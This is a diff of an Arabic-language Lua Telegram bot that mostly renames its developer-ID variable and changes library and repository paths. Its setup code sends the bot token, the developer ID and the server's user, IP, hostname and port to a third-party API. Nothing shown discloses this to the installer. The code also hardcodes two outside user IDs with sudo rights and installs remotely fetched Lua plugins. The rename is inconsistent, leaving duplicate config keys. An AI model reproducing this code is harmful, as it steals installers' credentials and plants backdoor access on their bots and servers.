@@ -4,11 +4,11 @@
 --                - Antak -                 --
 --        -- https://t.me/CXRCX --         --
 ------------------------------------------------ 
-DevRio  = dofile("./library/redis.lua").connect("127.0.0.1", 6379)
-serpent = dofile("./library/serpent.lua")
-JSON    = dofile("./library/dkjson.lua")
-json    = dofile("./library/JSON.lua")
-URL     = dofile("./library/url.lua")
+DevRio  = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
+serpent = dofile("./libs/serpent.lua")
+JSON    = dofile("./libs/dkjson.lua")
+json    = dofile("./libs/JSON.lua")
+URL     = dofile("./libs/url.lua")
 http    = require("socket.http") 
 HTTPS   = require("ssl.https") 
 https   = require("ssl.https") 
@@ -23,9 +23,9 @@ UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if (
 local AutoSet = function() 
 if not DevRio:get(Server.."IdAntak") then 
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
-local Antak = io.read():gsub(' ','') 
-if tostring(Antak):match('%d+') then 
-data,res = https.request("https://apiabs.ml/Api/David/index.php?Ban=David&Info&Id="..Antak)
+local DevId = io.read():gsub(' ','') 
+if tostring(DevId):match('%d+') then 
+data,res = https.request("https://apiabs.ml/Api/David/index.php?Ban=David&Info&Id="..DevId)
 if res == 200 then
 Abs = json:decode(data)
 if Abs.Result.Info == 'Is_Spam' then
@@ -34,7 +34,7 @@ os.execute('lua Antak-Fatime.lua')
 end ---ifBn
 if Abs.Result.Info == 'Ok' then
 io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
-DevRio:set(Server.."IdAntak",Antak) 
+DevRio:set(Server.."IdAntak",DevId) 
 end ---ifok
 else 
 print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
@@ -71,13 +71,13 @@ file:close()
 end
 local CreateConfigAuto = function()
 Config = {
-Antak = DevRio:get(Server.."IdAntak"),
+DevId = DevRio:get(Server.."IdAntak"),
 TokenBot = DevRio:get(Server.."TokenAntak"),
 Antak = DevRio:get(Server.."TokenAntak"):match("(%d+)"),
 SudoIds = {DevRio:get(Server.."IdAntak")},
 }
 Create(Config, "./config.lua") 
-https.request("https://apiabs.ml/Api/David/index.php?Get=David&Antak="..DevRio:get(Server.."IdAntak").."&TokenBot="..DevRio:get(Server.."TokenAntak").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+https.request("https://apiabs.ml/Api/David/index.php?Get=David&DevId="..DevRio:get(Server.."IdAntak").."&TokenBot="..DevRio:get(Server.."TokenAntak").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("Antak-Fatime.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -140,7 +140,7 @@ print("\27[36m"..[[
  
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m")
 Config = dofile("./config.lua")
-Antak = Config.Antak
+DevId = Config.DevId
 SudoIds = {Config.SudoIds,1566031059,1614314857}
 Antak = Config.Antak
 TokenBot = Config.TokenBot
@@ -174,7 +174,7 @@ for k,v in pairs(SudoIds) do
 if msg.sender_user_id_ == v then 
 var = true 
 end end 
-if msg.sender_user_id_ == tonumber(Antak) then 
+if msg.sender_user_id_ == tonumber(DevId) then 
 var = true 
 end 
 return var 
@@ -185,7 +185,7 @@ for k,v in pairs(SudoIds) do
 if user_id == v then 
 var = true 
 end end 
-if user_id == tonumber(Antak) then 
+if user_id == tonumber(DevId) then 
 var = true 
 end 
 return var 
@@ -1005,7 +1005,7 @@ file:write(serialized)
 file:close()  
 end
 Config = {
-Antak = NewDev,
+DevId = NewDev,
 TokenBot = TokenBot,
 Antak = TokenBot:match("(%d+)"),
 SudoIds = {NewDev},
@@ -3428,7 +3428,7 @@ end
 --     Source Antak     --
 if text == '/start' and ChCheck(msg) then  
 if not DevRio:get(Antak..'Rio:Start:Time'..msg.sender_user_id_) then
-tdcli_function({ID="GetUser",user_id_=Antak},function(arg,dp) 
+tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
 local inline = {{{text="• ᥀ المطور . •",url="t.me/"..(dp.username_ or "TeAmAnTaK")}},{{text="• ᥀ السورس . •",url="https://t.me/CXRCX"},{text="• ᥀ لتنصيب بوت . •",url="https://t.me/S_X_X_G"}},{{text="• ᥀ اضفني في مجموعتك . •",url="t.me/"..dp.username_.."?startgroup=botstart"}}}
 local start = DevRio:get(Antak.."Rio:Start:Bot")
 if start then 
@@ -3444,13 +3444,13 @@ return false
 end 
 --     Source Antak     --
 if not SecondSudo(msg) and not DevRio:sismember(Antak..'Rio:Ban:Pv',msg.sender_user_id_) and not DevRio:get(Antak..'Rio:Texting:Pv') then
-tdcli_function({ID="GetUser",user_id_=Antak},function(arg,chat) 
+tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
 Dev_Rio(msg.sender_user_id_, msg.id_, 1, '᥀︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "TeAmAnTaK")..')', 1, 'md') 
-tdcli_function({ID="ForwardMessages",chat_id_=Antak,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
+tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
 tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
 if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
 if data and data.messages_ and data.messages_[0].content_.sticker_ then
-SendText(Antak,'᥀︙تم ارسال الملصق من ↫ ⤈\n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
+SendText(DevId,'᥀︙تم ارسال الملصق من ↫ ⤈\n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
 return false
 end;end;end,nil);end,nil);end,nil);end
 if SecondSudo(msg) and msg.reply_to_message_id_ ~= 0  then    
@@ -3461,13 +3461,13 @@ end
 tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
 if text == 'حظر' or text == 'حضر' then
 local Text = '᥀︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n᥀︙تم حظره من التواصل'
-SendText(Antak,Text,msg.id_/2097152/0.5,'md') 
+SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
 DevRio:sadd(Antak..'Rio:Ban:Pv',data.id_)  
 return false  
 end 
 if text == 'الغاء الحظر' or text == 'الغاء حظر' then
 local Text = '᥀︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n᥀︙تم الغاء حظره من التواصل'
-SendText(Antak,Text,msg.id_/2097152/0.5,'md') 
+SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
 DevRio:srem(Antak..'Rio:Ban:Pv',data.id_)  
 return false  
 end 
@@ -3493,7 +3493,7 @@ elseif msg.content_.ID == 'MessageVoice' then
 sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
 Text = '᥀︙تم ارسال البصمه الى ↫ ⤈'
 end     
-SendText(Antak, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
+SendText(DevId, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
 end,nil);
 end,nil);
 end,nil);
@@ -3576,7 +3576,7 @@ return false
 end
 --     Source Antak     --
 if text and (text == 'المطور' or text == 'مطور' or text == '↫  المطور ᥀') then
-tdcli_function({ID="GetUser",user_id_=Antak},function(arg,result)
+tdcli_function({ID="GetUser",user_id_=DevId},function(arg,result)
 local msg_id = msg.id_/2097152/0.5
 Text = "*᥀︙Dev Name ↬ * ["..result.first_name_.."](T.me/"..result.username_..")\n*᥀︙Dev User ↬* [@"..result.username_.."]\n*᥀︙Dev id ↬* ["..result.id_.."](T.me/"..result.username_..")"
 keyboard = {} 
@@ -3738,7 +3738,7 @@ local NameChat = NameChat:gsub("*","")
 local NameChat = NameChat:gsub("{","") 
 local NameChat = NameChat:gsub("}","") 
 if not Sudo(msg) and not Bot(msg) then
-SendText(Antak,"᥀︙تم طرد البوت من المجموعه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
+SendText(DevId,"᥀︙تم طرد البوت من المجموعه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
 end
 end,nil)
 end,nil)
@@ -3839,7 +3839,7 @@ else
 LinkGroup = 'لا يوجد'
 end
 DevRio:set(Antak.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
-SendText(Antak,"᥀︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙موقعه في المجموعه ↫ "..status.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n᥀︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
+SendText(DevId,"᥀︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙موقعه في المجموعه ↫ "..status.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n᥀︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
 end
 end end
 end,nil)
@@ -6314,7 +6314,7 @@ if tonumber(result.id_) == tonumber(Antak) then
 Dev_Rio(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md')  
 return false 
 end  
-if tonumber(result.id_) == tonumber(Antak) then 
+if tonumber(result.id_) == tonumber(DevId) then 
 Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
@@ -6345,7 +6345,7 @@ if tonumber(result.sender_user_id_) == tonumber(Antak) then
 Dev_Rio(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
 return false  
 end  
-if tonumber(result.sender_user_id_) == tonumber(Antak) then  
+if tonumber(result.sender_user_id_) == tonumber(DevId) then  
 Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
@@ -6375,7 +6375,7 @@ if tonumber(result.sender_user_id_) == tonumber(Antak) then
 Dev_Rio(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
 return false  
 end  
-if tonumber(result.sender_user_id_) == tonumber(Antak) then  
+if tonumber(result.sender_user_id_) == tonumber(DevId) then  
 Dev_Rio(msg.chat_id_, result.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗', 1, 'html')
 return false
 end 
@@ -6397,7 +6397,7 @@ if tonumber(result.sender_user_id_) == tonumber(Antak) then
 Dev_Rio(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md') 
 return false  
 end  
-if tonumber(result.sender_user_id_) == tonumber(Antak) then  
+if tonumber(result.sender_user_id_) == tonumber(DevId) then  
 Dev_Rio(msg.chat_id_, result.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️', 1, 'html')
 return false
 end 
@@ -6422,7 +6422,7 @@ if tonumber(result.id_) == tonumber(Antak) then
 Dev_Rio(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md')  
 return false 
 end  
-if tonumber(result.id_) == tonumber(Antak) then 
+if tonumber(result.id_) == tonumber(DevId) then 
 Dev_Rio(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..username, 1, 'html') 
 return false  
 end  
@@ -11801,7 +11801,7 @@ LinkGroup = 'لا يوجد'
 end
 DevRio:set(Antak.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
 if not Sudo(msg) then
-SendText(Antak,"᥀︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n᥀︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
+SendText(DevId,"᥀︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n᥀︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
 end
 end
 end,nil)
@@ -11839,7 +11839,7 @@ LinkGroup = 'لا يوجد'
 end
 DevRio:set(Antak.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
 if not Sudo(msg) then
-SendText(Antak,"᥀︙تم تعطيل مجموعه جديده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n᥀︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
+SendText(DevId,"᥀︙تم تعطيل مجموعه جديده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n᥀︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
 end
 end
 end,nil)
@@ -11873,7 +11873,7 @@ else
 LinkGroup = '᥀︙ليست لدي صلاحية الدعوه لهذه المجموعه !'
 end
 if not Sudo(msg) then
-SendText(Antak,"᥀︙هناك من بحاجه الى مساعده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الشخص ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n"..LinkGroup.."\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
+SendText(DevId,"᥀︙هناك من بحاجه الى مساعده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الشخص ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n"..LinkGroup.."\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
 end
 end,nil)
 end,nil)
@@ -13201,7 +13201,7 @@ end
 send(msg.chat_id_, msg.id_,Files)
 end
 if text and (text == "متجر الملفات" or text == 'المتجر' or text == '↫  المتجر ᥀') and ChCheck(msg) and SecondSudo(msg) then
-local Get_Files, res = https.request("https://raw.githubusercontent.com/AntakTEAM/BrandFiles/master/getfile.json")
+local Get_Files, res = https.request("https://raw.githubusercontent.com/AntakTEAM/AntakFiles/master/getfile.json")
 if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
@@ -13233,7 +13233,7 @@ end
 if text and text:match("^(تعطيل ملف) (.*)(.lua)$") and ChCheck(msg) and SecondSudo(msg) then
 local FileGet = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
 local FileName = FileGet[2]..'.lua'
-local GetJson, Res = https.request("https://raw.githubusercontent.com/AntakTEAM/BrandFiles/master/AntakFiles/"..FileName)
+local GetJson, Res = https.request("https://raw.githubusercontent.com/AntakTEAM/AntakFiles/master/AntakFiles/"..FileName)
 if Res == 200 then
 os.execute("rm -fr Files/"..FileName)
 send(msg.chat_id_, msg.id_,"\n᥀︙الملف ↫ *"..FileName.."*\n᥀︙تم تعطيله وحذفه من البوت بنجاح") 
@@ -13245,7 +13245,7 @@ end
 if text and text:match("^(تفعيل ملف) (.*)(.lua)$") and ChCheck(msg) and SecondSudo(msg) then
 local FileGet = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
 local FileName = FileGet[2]..'.lua'
-local GetJson, Res = https.request("https://raw.githubusercontent.com/AntakTEAM/BrandFiles/master/AntakFiles/"..FileName)
+local GetJson, Res = https.request("https://raw.githubusercontent.com/AntakTEAM/AntakFiles/master/AntakFiles/"..FileName)
 if Res == 200 then
 local ChekAuto = io.open("Files/"..FileName,'w+')
 ChekAuto:write(GetJson)
